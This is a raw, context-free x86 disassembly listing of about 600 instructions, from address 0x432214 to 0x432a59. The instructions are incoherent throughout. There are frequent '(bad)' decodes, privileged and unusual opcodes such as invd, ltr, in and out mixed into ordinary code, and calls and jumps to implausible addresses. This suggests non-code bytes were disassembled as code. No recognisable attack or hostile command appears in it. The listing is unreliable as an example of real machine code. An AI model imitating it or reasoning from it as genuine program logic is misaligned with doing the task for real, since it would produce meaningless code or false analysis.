  432214:	shr    ah,0x84
  432217:	xchg   DWORD PTR [eax],eax
  432219:	add    DWORD PTR [eax],eax
  43221b:	add    bh,bh
  43221d:	dec    ebp
  43221e:	and    BYTE PTR [ecx-0x38],dl
  432221:	push   eax
  432222:	dec    DWORD PTR [ebx+0xfd885]
  432228:	mov    BYTE PTR [ebp+0x508bac00],cl
  43222e:	mov    WORD PTR [ecx+0x0],ss
  432231:	lea    ecx,[ebx+0x108b20d8]
  432237:	mov    WORD PTR [edx],ds
  432239:	add    BYTE PTR [edi+0xff01ff],al
  43223f:	mov    ecx,DWORD PTR [ebp-0x28]
  432242:	push   ecx
  432243:	shl    BYTE PTR [ebp+0x3a],0x8b
  432247:	inc    ebp
  432248:	in     al,0xeb
  43224a:	jno    0x4321d7
  43224c:	push   edx
  43224d:	mov    DWORD PTR [eax-0x28],edx
  432250:	mov    eax,DWORD PTR [ebp+0x20]
  432253:	je     0x4321dc
  432255:	mov    eax,DWORD PTR [ecx]
  432257:	sbb    BYTE PTR [eax],al
  432259:	pop    DWORD PTR [eax]
  43225b:	add    esi,eax
  43225d:	add    bl,al
  43225f:	adc    DWORD PTR [edi],esi
  432261:	jmp    0x8bce72b3
  432266:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43226d:	jne    0x4321fa
  43226f:	mov    ecx,DWORD PTR [eax]
  432271:	in     al,0x75
  432273:	pop    DWORD PTR [ecx+0x5401]
  432279:	push   edx
  43227a:	inc    DWORD PTR [ebx]
  43227c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432282:	add    BYTE PTR [edi+0x9],dl
  432285:	call   DWORD PTR [esi]
  432287:	and    dl,al
  432289:	and    bh,bh
  43228b:	inc    edi
  43228d:	test   eax,edx
  43228f:	sldt   ebx
  432292:	xor    al,BYTE PTR [eax]
  432294:	pushf  
  432295:	(bad)  
  432296:	jmp    0x4322a4
  432298:	mov    eax,edi
  43229a:	or     al,0x75
  43229c:	inc    eax
  43229d:	call   0x4319a5
  4322a2:	mov    eax,eax
  4322a4:	loopne 0x43222a
  4322a6:	inc    ebp
  4322a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4322ad:	mov    eax,DWORD PTR [ebp+0x20]
  4322b0:	add    edi,ecx
  4322b2:	add    BYTE PTR [eax],ch
  4322b4:	cmp    edi,0x18
  4322b7:	test   DWORD PTR [ebp+0xf],esi
  4322ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322c1:	jne    0x4322c5
  4322c3:	call   0xffa21d88
  4322c8:	leave  
  4322c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4322cd:	add    ah,ch
  4322cf:	add    BYTE PTR [edi-0x48fef979],dh
  4322d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322dc:	inc    esp
  4322dd:	mov    ebx,DWORD PTR [eax]
  4322df:	fcom   st(2)
  4322e1:	add    BYTE PTR [edi],bl
  4322e3:	lea    ecx,[eax-0x18]
  4322e6:	(bad)  
  4322e7:	push   DWORD PTR [ecx]
  4322e9:	call   0xffb5704b
  4322ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4322f2:	fstp   DWORD PTR [esi+ebx*8]
  4322f5:	push   ebp
  4322f6:	pop    ebp
  4322f7:	mov    esi,DWORD PTR [edx-0x38]
  4322fa:	add    DWORD PTR [eax],0x28
  4322fd:	mov    edi,DWORD PTR [ebx]
  4322ff:	xor    esi,DWORD PTR [edx+0x3]
  432302:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432306:	pop    ebp
  432307:	or     al,0x4
  432309:	inc    ecx
  43230a:	push   ebp
  43230b:	(bad)  
  43230c:	in     al,dx
  43230d:	or     ah,ch
  43230f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432310:	xbegin 0xffc89906
  432316:	clc    
  432317:	adc    al,0x45
  432319:	div    BYTE PTR [edx]
  43231b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432322:	test   DWORD PTR [ebx+0x666300f8],ebx
  432328:	add    BYTE PTR [ecx+0x66],dh
  43232b:	add    eax,DWORD PTR [ebp+0x52]
  43232e:	adc    eax,0xffffffa0
  432331:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432337:	test   DWORD PTR [eax],eax
  432339:	clc    
  43233a:	data16 or al,BYTE PTR [ebp+0x45]
  43233e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432345:	rol    BYTE PTR [ebp+0x45],1
  432348:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43234e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432354:	push   ebx
  432355:	add    BYTE PTR [eax+eax*1+0x51],dl
  432359:	jge    0x43238e
  43235b:	add    BYTE PTR [esi+0x4],dl
  43235e:	jne    0x4323c5
  432360:	mov    edx,0x457200
  432365:	jmp    0x432329
  432367:	xor    edi,DWORD PTR [ebx]
  432369:	pop    edi
  43236a:	cvtdq2ps xmm7,xmm0
  43236d:	ret    0x0
  432370:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432376:	xor    ecx,DWORD PTR [edi]
  432378:	add    eax,DWORD PTR [ecx+0x3b]
  43237b:	push   ebx
  43237c:	rdpmc  
  43237e:	out    0x8d,al
  432380:	add    BYTE PTR [eax],cl
  432382:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432388:	ret    0x450c
  43238b:	sbb    al,0x8b
  43238d:	cmp    eax,esi
  43238f:	or     cl,al
  432391:	or     al,0xc2
  432393:	pop    eax
  432394:	inc    ebp
  432395:	add    ecx,DWORD PTR [edi]
  432397:	add    esi,DWORD PTR [ebp+0x39]
  43239a:	invd   
  43239c:	jge    0x4323a8
  43239e:	mov    eax,0x478ac0
  4323a3:	cli    
  4323a4:	xor    esp,ecx
  4323a6:	mov    ebx,0x5b8ac0
  4323ab:	ret    0x33
  4323ae:	mov    eax,0x833b8b
  4323b3:	sub    BYTE PTR [ebx],al
  4323b5:	inc    ebp
  4323b6:	xor    ax,di
  4323b9:	pushf  
  4323ba:	inc    bh
  4323bc:	mov    esp,esp
  4323be:	hlt    
  4323bf:	test   DWORD PTR [ebp-0x8],esi
  4323c2:	mov    eax,DWORD PTR [ebp-0x14]
  4323c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323cb:	dec    edi
  4323cc:	or     BYTE PTR [eax],al
  4323ce:	jne    0x432359
  4323d0:	mov    esi,esp
  4323d2:	call   0x77a9af97
  4323d7:	inc    ebp
  4323d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323e4:	add    BYTE PTR [esi+0x7d],ah
  4323e7:	inc    ebp
  4323e8:	mov    bx,WORD PTR [ebp+0x8]
  4323ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4323f3:	inc    ebp
  4323f4:	mov    bx,di
  4323f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4323fe:	jge    0x4323c1
  432400:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432406:	cli    
  432407:	xor    bl,bh
  432409:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43240f:	test   BYTE PTR [eax],cl
  432411:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432418:	cmp    ebp,eax
  43241a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432421:	test   BYTE PTR [ebp+0x1],bh
  432424:	mov    ebx,0x458a00
  432429:	xor    esi,DWORD PTR [ebx]
  43242b:	add    esp,DWORD PTR [esi-0x77]
  43242e:	pop    ebp
  43242f:	loopne 0x432497
  432431:	inc    ebp
  432432:	clc    
  432433:	xor    edi,DWORD PTR [ebx]
  432435:	add    esi,DWORD PTR [edx-0x77]
  432438:	data16 fdivr QWORD PTR [ebp-0x49]
  43243c:	mov    ebx,0xb78afc
  432441:	hlt    
  432442:	xor    edi,DWORD PTR [esi+eiz*2]
  432445:	add    BYTE PTR [ebp+0x66],bl
  432448:	data16 lock clc 
  43244b:	cmp    al,0x3b
  43244d:	add    BYTE PTR [edi+0x66],dh
  432450:	psubq  mm7,QWORD PTR [ebp+0x2]
  432454:	ltr    WORD PTR [ebp+0x66]
  432458:	add    esi,eax
  43245a:	add    di,WORD PTR [ebp+0x2b]
  43245e:	data16 data16 jge 0x4324df
  432462:	mov    ebx,0xe08a8b
  432467:	jge    0x43249c
  432469:	data16 data16 xor al,0x5d
  43246d:	data16 data16 jne 0x432469
  432471:	mov    edi,DWORD PTR [ebx]
  432473:	fdiv   QWORD PTR [edx+0x7d]
  432476:	data16 data16 jge 0x4324ae
  43247a:	mov    ebx,0x758a66
  43247f:	mov    esi,0x667233
  432484:	pop    ebp
  432485:	or     BYTE PTR [esi+0x0],ah
  432488:	clc    
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	lock ja 0x432419
  43248e:	(bad)  
  432490:	jge    0x432489
  432492:	invd   
  432494:	pop    ebp
  432495:	add    BYTE PTR [ebx],al
  432497:	(bad)  
  432498:	cmp    di,WORD PTR [ebp+0xf]
  43249c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324a0:	mov    bx,WORD PTR [ebp-0x10]
  4324a4:	pop    bp
  4324a6:	fbstp  TBYTE PTR [ebx]
  4324a8:	test   DWORD PTR [ebx],eax
  4324aa:	add    BYTE PTR [ebx],bh
  4324ac:	add    BYTE PTR [esi+0x7d],ah
  4324af:	jge    0x43243c
  4324b1:	data16 in al,dx
  4324b3:	pop    ebp
  4324b4:	stc    
  4324b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324bc:	mov    edi,ebx
  4324be:	in     al,dx
  4324bf:	test   BYTE PTR [ebp+0x0],bh
  4324c2:	mov    eax,DWORD PTR [eax]
  4324c4:	call   0xbd401e54
  4324c9:	cmp    al,0x9b
  4324cb:	add    BYTE PTR [edx],dh
  4324cd:	mov    bx,di
  4324d0:	call   0x8b4ba260
  4324d5:	add    ebp,esp
  4324d7:	mov    bx,di
  4324da:	jnp    0x432502
  4324dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324e2:	mov    eax,DWORD PTR [eax]
  4324e4:	call   0x7c3eb04f
  4324e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4324ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4324f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4324fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432504:	(bad)  
  432505:	cld    
  432506:	jne    0x432544
  432508:	xor    eax,DWORD PTR [eax]
  43250a:	mov    esp,DWORD PTR [esi-0x10]
  43250d:	sti    
  43250e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432515:	data16 adc bl,bh
  432518:	push   ebp
  432519:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432520:	mov    WORD PTR [eax],es
  432522:	fwait
  432523:	data16 xor bh,bl
  432526:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43252c:	mov    esp,DWORD PTR [esi-0x14]
  43252f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432535:	or     al,0x2b
  432537:	mov    bh,0xba
  432539:	hlt    
  43253a:	mov    bh,bl
  43253c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432542:	dec    esi
  432543:	or     al,0x0
  432545:	mov    edi,DWORD PTR [ebx]
  432547:	or     BYTE PTR [ebp+0x3b],dh
  43254a:	mov    ecx,DWORD PTR [edi]
  43254c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432552:	xor    al,0xd8
  432554:	pop    bp
  432556:	lock xor esi,DWORD PTR [ebx]
  432559:	lea    esp,[esi+0x1f]
  43255c:	icebp  
  43255d:	jb     0x432563
  43255f:	add    al,al
  432561:	jge    0x43256f
  432563:	mov    eax,eax
  432565:	fsubr  st,st(3)
  432567:	pop    ebp
  432568:	mov    esi,DWORD PTR [ebx]
  43256a:	in     al,0x8d
  43256c:	rcr    DWORD PTR [edi],0xc2
  43256f:	jb     0x4325cf
  432571:	add    cl,cl
  432573:	jge    0x432581
  432575:	mov    edx,DWORD PTR [ebp-0x20]
  432578:	in     al,dx
  432579:	pop    ebp
  43257a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43257f:	cmp    di,WORD PTR [ebp+0x0]
  432583:	mov    ebp,DWORD PTR [ebx]
  432585:	fdivr  QWORD PTR [esi+0x668a5d]
  43258b:	cmp    al,0x33
  43258d:	mov    si,0x4e7d
  432591:	mov    eax,DWORD PTR [eax]
  432593:	lock inc ebp
  432595:	mov    esi,DWORD PTR [eax]
  432597:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43259e:	clc    
  43259f:	(bad)  
  4325a0:	cmp    edi,DWORD PTR [ebx]
  4325a2:	je     0x4325b3
  4325a4:	push   ebx
  4325a5:	loopne 0x4325b6
  4325a7:	dec    ecx
  4325a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4325ac:	int    0xf1
  4325ae:	mov    esi,0x703084d
  4325b3:	pcmpgtd mm6,mm1
  4325b6:	add    BYTE PTR [ebp+0x66],dh
  4325b9:	jmp    0x432586
  4325bb:	mov    eax,DWORD PTR [ebx]
  4325bd:	lock push ebp
  4325bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325c5:	or     bh,dl
  4325c7:	jb     0x4325c7
  4325c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325cf:	loopne 0x4325d1
  4325d1:	jne    0x4325d5
  4325d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4325d7:	mov    ecx,ebx
  4325d9:	data16 cmp al,0xf1
  4325dc:	add    BYTE PTR [esi+eiz*2],bh
  4325df:	add    bl,cl
  4325e1:	retw   0xf2
  4325e5:	ret    0x66
  4325e8:	retf   
  4325e9:	enterw 0x4df1,0x19
  4325ee:	pop    edi
  4325ef:	jne    0x432572
  4325f1:	mov    esi,DWORD PTR [eax]
  4325f3:	call   0x77b7b194
  4325f8:	xor    ebp,DWORD PTR [ebx]
  4325fa:	lea    esp,[esi+0x48]
  4325fd:	repnz in eax,0x3b
  432600:	add    BYTE PTR [ebp-0x37],dh
  432603:	xor    edx,DWORD PTR [ebp-0x15]
  432606:	in     al,dx
  432607:	xor    edx,DWORD PTR [esi+0x40]
  43260a:	mov    DWORD PTR [edi],0x338545fc
  432610:	clc    
  432611:	add    esi,DWORD PTR [ecx]
  432613:	pop    edi
  432614:	pushf  
  432615:	pop    ebx
  432616:	call   0xff4425dd
  43261b:	mov    edi,eax
  43261d:	push   ecx
  43261e:	pop    es
  43261f:	mov    edi,DWORD PTR [eax]
  432621:	push   esi
  432622:	inc    esi
  432623:	add    bh,BYTE PTR [esi+0x0]
  432626:	popa   
  432627:	data16 (bad) 
  432629:	into   
  43262a:	gs cmp al,0xcd
  43262d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432633:	ret    0x66
  432636:	add    bh,al
  432638:	add    bh,ah
  43263a:	add    BYTE PTR [ebp+0x31c3f866],al
  432640:	cmp    al,0x9c
  432642:	add    BYTE PTR [esi+0x66],ah
  432645:	into   
  432646:	ret    
  432647:	pop    ebp
  432648:	adc    BYTE PTR [edi+0x0],dl
  43264b:	mov    bh,0x66
  43264d:	mov    edi,0xff038dc3
  432652:	jne    0x4326a8
  432654:	lea    edx,[ecx+0x1]
  432657:	mov    ebx,0xd64ff1
  43265c:	sar    DWORD PTR [ebx],1
  43265e:	test   BYTE PTR [ebp+0x36],dh
  432661:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432665:	push   edi
  432666:	xor    BYTE PTR [ebx],0x38
  432669:	mov    esi,ebx
  43266b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432671:	ss inc ebp
  432673:	fs pop ebx
  432675:	mov    ebx,0x9c3b30
  43267a:	je     0x4326a7
  43267c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432682:	mov    WORD PTR [ebx],?
  432684:	ss mov ebx,0x8b4e64
  43268a:	pop    edi
  43268b:	cmp    ecx,ecx
  43268d:	jne    0x4326e4
  43268f:	mov    ebp,esp
  432691:	cld    
  432692:	push   esi
  432693:	pop    ebx
  432694:	inc    ebp
  432695:	stc    
  432696:	xor    BYTE PTR [ebp+0x9bef89c],al
  43269c:	test   esi,ecx
  43269e:	clc    
  43269f:	test   dl,dl
  4326a1:	cmp    bh,bh
  4326a3:	fs pop si
  4326a6:	or     bl,al
  4326a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4326ae:	retf   0x3c45
  4326b1:	xor    BYTE PTR [eax],al
  4326b3:	pushf  
  4326b4:	mov    si,0x85ca
  4326b8:	ret    0xf8
  4326bb:	pop    ebx
  4326bc:	dec    dx
  4326bf:	mov    edx,DWORD PTR [edi-0x76]
  4326c2:	push   edi
  4326c3:	add    al,0xb7
  4326c5:	xor    al,0xba
  4326c7:	cmp    al,0x8d
  4326c9:	je     0x4326ca
  4326cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326cf:	lea    edi,[ebx+0x544fff]
  4326d5:	push   ecx
  4326d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4326d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326df:	add    BYTE PTR [ebx],dh
  4326e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4326ee:	mov    ebx,0x3b3b00
  4326f3:	jne    0x432720
  4326f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4326fb:	xor    esi,DWORD PTR [ebx]
  4326fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432703:	push   edi
  432704:	cmp    esp,ebp
  432706:	jne    0x432708
  432708:	sbb    DWORD PTR [eax],0x8085c3fc
  43270e:	clc    
  43270f:	inc    esi
  432710:	pop    ebx
  432711:	sti    
  432712:	add    eax,0xeb8bc075
  432717:	cld    
  432718:	xor    edi,DWORD PTR ds:0xf8c3855e
  43271e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432721:	rol    DWORD PTR [ebp-0x37],0xf
  432725:	mov    DWORD PTR [eax],ecx
  432727:	inc    edi
  432728:	(bad)  
  432729:	in     eax,0xfe
  43272b:	add    bh,bh
  43272d:	(bad)  
  43272e:	mov    esi,0xc38a5e
  432733:	mov    esi,DWORD PTR [ebx]
  432735:	push   ecx
  432736:	mov    edi,0xfc4ec7
  43273b:	test   DWORD PTR [ebp-0x8],edx
  43273e:	xor    di,ax
  432741:	pushf  
  432742:	sub    ebp,eax
  432744:	inc    ebp
  432745:	(bad)  
  432746:	sub    edi,edi
  432748:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43274e:	inc    ebp
  43274f:	add    BYTE PTR [esi+0x2b],ah
  432752:	or     bh,BYTE PTR [edx+0xf8ac2]
  432758:	cmp    al,0x33
  43275a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432760:	(bad)  
  432761:	cmp    esi,DWORD PTR [ebx]
  432763:	je     0x43271d
  432765:	push   ebx
  432766:	dec    esi
  432767:	str    ecx
  43276a:	cmp    esp,DWORD PTR [ebp+0x75]
  43276d:	int    0x33
  43276f:	mov    edi,0x789085f
  432774:	mov    edx,DWORD PTR [eax]
  432776:	cld    
  432777:	add    cl,cl
  432779:	data16 add al,0xcb
  43277c:	push   ebp
  43277d:	add    ebp,esp
  43277f:	jne    0x43276d
  432781:	(bad)  
  432782:	mov    DWORD PTR [ecx],0xd685f7ec
  432788:	clc    
  432789:	xlat   BYTE PTR ds:[ebx]
  43278a:	inc    ebp
  43278b:	mov    esi,DWORD PTR [edx]
  43278d:	push   eax
  43278e:	pushf  
  43278f:	in     eax,0x8b
  432791:	add    ah,ch
  432793:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432797:	add    ax,0x72cb
  43279b:	cmp    al,0x0
  43279d:	add    BYTE PTR [ebp+0x66],al
  4327a0:	(bad)  
  4327a1:	retf   
  4327a2:	lock ret 0x85
  4327a6:	clc    
  4327a7:	inc    bp
  4327a9:	retf   
  4327aa:	cmp    eax,0xc77d9cc8
  4327af:	xor    ah,bh
  4327b1:	pushf  
  4327b2:	test   DWORD PTR [edi-0x8],ebx
  4327b5:	je     0x4327fc
  4327b7:	xor    esi,DWORD PTR ds:0x7020840
  4327bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4327c1:	push   ebp
  4327c2:	add    esp,ebp
  4327c4:	jb     0x432751
  4327c6:	add    BYTE PTR [eax],cl
  4327c8:	dec    ebp
  4327c9:	mov    bh,0x81
  4327cb:	push   esi
  4327cc:	push   esp
  4327cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327d4:	xor    al,BYTE PTR [eax]
  4327d6:	mov    edx,DWORD PTR [edi+0x10]
  4327d9:	(bad)  
  4327da:	scas   eax,DWORD PTR es:[edi]
  4327db:	ret    0x3b
  4327de:	jns    0x3b4424d1
  4327e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327e8:	dec    ebp
  4327e9:	or     BYTE PTR [ebx],ch
  4327eb:	ret    0x458b
  4327ee:	lock jmp 0x4327e2
  4327f1:	mov    ecx,DWORD PTR [eax]
  4327f3:	or     BYTE PTR [edi],al
  4327f5:	mov    ecx,eax
  4327f7:	xor    DWORD PTR [edx+0x2],0x0
  4327fb:	mov    bh,0xc1
  4327fd:	adc    BYTE PTR [eax],dh
  4327ff:	iret   
  432800:	inc    ebp
  432801:	mov    DWORD PTR [ebx],0x4dfff8c4
  432807:	inc    BYTE PTR [ebx]
  432809:	ret    0xf8
  43280c:	adc    DWORD PTR [esi+0x10],esp
  43280f:	clc    
  432810:	dec    ecx
  432811:	fisttp WORD PTR [ecx+0x456604c0]
  432817:	add    dh,BYTE PTR ds:0x75e0845
  43281d:	ret    0x4d
  432820:	lea    ecx,[ebx+0x18728301]
  432826:	add    BYTE PTR [ebp+0x45],al
  432829:	xor    ecx,ebp
  43282b:	pushf  
  43282c:	add    bh,al
  43282e:	add    al,ch
  432830:	inc    ebp
  432831:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432837:	xor    eax,0x781084d
  43283c:	push   esp
  43283d:	fwait
  43283e:	push   ecx
  43283f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432845:	inc    ebp
  432846:	cmp    edi,DWORD PTR [ecx]
  432848:	jbe    0x4327e6
  43284a:	mov    eax,edi
  43284c:	or     ah,dh
  43284e:	inc    ebp
  43284f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432855:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43285b:	in     al,dx
  43285c:	hlt    
  43285d:	push   esp
  43285e:	push   esp
  43285f:	push   ecx
  432860:	push   ecx
  432861:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432867:	fwait
  432868:	fwait
  432869:	xor    dh,BYTE PTR [edx]
  43286b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432871:	or     BYTE PTR [ebp+0x7],al
  432874:	mov    eax,ecx
  432876:	clc    
  432877:	jb     0x43283a
  432879:	add    BYTE PTR [ebp+0x55],cl
  43287c:	or     DWORD PTR [edi],0xc251d154
  432882:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43288c:	mov    edi,eax
  43288e:	or     cl,al
  432890:	inc    ebp
  432891:	dec    ebp
  432892:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432898:	or     WORD PTR [ecx],0x899b
  43289d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328a3:	mov    edx,DWORD PTR [ecx+0x8]
  4328a6:	mov    eax,DWORD PTR [ebp-0x8]
  4328a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328b6:	inc    ebp
  4328b7:	dec    eax
  4328b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328be:	add    edx,DWORD PTR [ecx-0x8]
  4328c1:	mov    ecx,DWORD PTR [ecx]
  4328c3:	clc    
  4328c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328cb:	mov    ecx,ebp
  4328cd:	clc    
  4328ce:	(bad)  
  4328cf:	popf   
  4328d0:	inc    DWORD PTR [eax]
  4328d2:	ret    0x8b
  4328d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328db:	mov    edi,esp
  4328dd:	hlt    
  4328de:	test   ecx,esi
  4328e0:	clc    
  4328e1:	or     BYTE PTR [ebp+0x7],al
  4328e4:	xor    al,cl
  4328e6:	pushf  
  4328e7:	jb     0x43291c
  4328e9:	add    BYTE PTR [eax-0x3f],al
  4328ec:	inc    eax
  4328ed:	daa    
  4328ee:	inc    ebp
  4328ef:	inc    ebp
  4328f0:	xor    eax,0x7f80803
  4328f5:	dec    ebp
  4328f6:	fwait
  4328f7:	add    esi,DWORD PTR [edx]
  4328f9:	clc    
  4328fa:	cmp    DWORD PTR [ecx],ecx
  4328fc:	or     al,0x8
  4328fe:	add    al,BYTE PTR [ebp+0x2c]
  432901:	xor    eax,0x7350845
  432906:	or     BYTE PTR [ebp+0x7],cl
  432909:	lea    ebx,[ebx-0x748dcdff]
  43290f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432916:	mov    edx,DWORD PTR [eax]
  432918:	cld    
  432919:	dec    ebp
  43291a:	push   esp
  43291b:	sub    edx,DWORD PTR [ecx-0x75]
  43291e:	add    eax,0xf172fc
  432923:	or     BYTE PTR [ebp+0x7],cl
  432926:	add    eax,ecx
  432928:	or     al,0x72
  43292a:	add    DWORD PTR [eax],eax
  43292c:	mov    ebx,0x29c2c1
  432931:	inc    ebp
  432932:	mov    eax,DWORD PTR [ebx]
  432934:	cmp    eax,0x3004d1c
  43293a:	xbegin 0x66c8b534
  432940:	clc    
  432941:	or     BYTE PTR [ebp+0x45],al
  432944:	xor    dh,BYTE PTR ds:0x78b089c
  43294a:	adc    BYTE PTR [ebp+0x45],cl
  43294d:	lea    eax,[ebp+0x33727501]
  432953:	add    cl,ch
  432955:	inc    ebp
  432956:	add    bl,ch
  432958:	add    BYTE PTR [ebx+0x45850845],cl
  43295e:	je     0x4328eb
  432960:	push   ebx
  432961:	or     al,0x85
  432963:	dec    ebp
  432964:	std    
  432965:	mov    bh,bh
  432967:	mov    BYTE PTR [ebp-0x75],al
  43296a:	mov    edi,eax
  43296c:	or     al,0x89
  43296e:	inc    ebp
  43296f:	clc    
  432970:	mov    esp,esp
  432972:	hlt    
  432973:	call   DWORD PTR [edi-0x37]
  432976:	push   esp
  432977:	or     al,0x51
  432979:	push   ebp
  43297a:	xor    ebp,esp
  43297c:	mov    esi,0x457251
  432981:	xor    esi,eax
  432983:	pushf  
  432984:	inc    ebp
  432985:	(bad)  
  432986:	mov    edi,eax
  432988:	or     al,0x85
  43298a:	add    al,bh
  43298c:	inc    eax
  43298e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432992:	or     ah,bh
  432994:	inc    eax
  432995:	push   esp
  432996:	jmp    0x4329e9
  432998:	mov    eax,DWORD PTR ds:0xe8720c
  43299e:	mov    DWORD PTR [ebp-0x8],eax
  4329a1:	jne    0x4329e8
  4329a3:	jmp    0x432930
  4329a5:	mov    ebp,DWORD PTR [eax]
  4329a7:	clc    
  4329a8:	retf   0xff54
  4329ab:	push   ecx
  4329ac:	mov    DWORD PTR ds:0x757210,eax
  4329b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4329b5:	sub    esp,DWORD PTR [ebx-0x77]
  4329b8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329bf:	or     ah,bh
  4329c1:	pop    es
  4329c2:	ds fwait
  4329c4:	push   DWORD PTR [edx]
  4329c6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329cc:	(bad)  
  4329cd:	mov    bh,bh
  4329cf:	jmp    0x4329bd
  4329d1:	leave  
  4329d2:	jne    0x4329dc
  4329d4:	call   0x30232e
  4329d9:	in     al,dx
  4329da:	dec    ebp
  4329db:	add    dh,BYTE PTR [ebx]
  4329dd:	add    BYTE PTR [ebx],al
  4329df:	inc    ebp
  4329e0:	cmp    esi,DWORD PTR [ecx]
  4329e2:	je     0x432980
  4329e4:	mov    eax,edi
  4329e6:	or     al,0xf0
  4329e8:	add    BYTE PTR [ebp+0x458bf845],al
  4329ee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4329f4:	adc    al,0x7
  4329f6:	enter  0x9fc0,0xa5
  4329fa:	rol    BYTE PTR [eax],0x5e
  4329fd:	mov    ecx,ecx
  4329ff:	or     al,0xc
  432a01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a08:	jmp    0x432a09
  432a0a:	push   ebp
  432a0b:	mov    esp,ebp
  432a0d:	cld    
  432a0e:	inc    ebp
  432a0f:	inc    ebp
  432a10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a17:	push   esi
  432a18:	push   esi
  432a19:	mov    edi,0x7af080f
  432a1e:	add    bh,al
  432a20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a26:	add    BYTE PTR [ecx+0x4540100f],cl
  432a2c:	mov    ebp,eax
  432a2e:	mov    ebp,edi
  432a30:	lock call edx
  432a33:	fcom   DWORD PTR [ebp+0x45]
  432a36:	mov    eax,0x148a8b
  432a3b:	push   ecx
  432a3c:	enter  0xc145,0x83
  432a40:	cmp    ecx,DWORD PTR [eax]
  432a42:	add    BYTE PTR [ebp+0x4d],al
  432a45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a4b:	call   0xffa325ba
  432a50:	cmp    eax,DWORD PTR [ebp-0xc]
  432a53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a57:	push   ebp
  432a58:	(bad)  
  432a59:	call   0x34285d
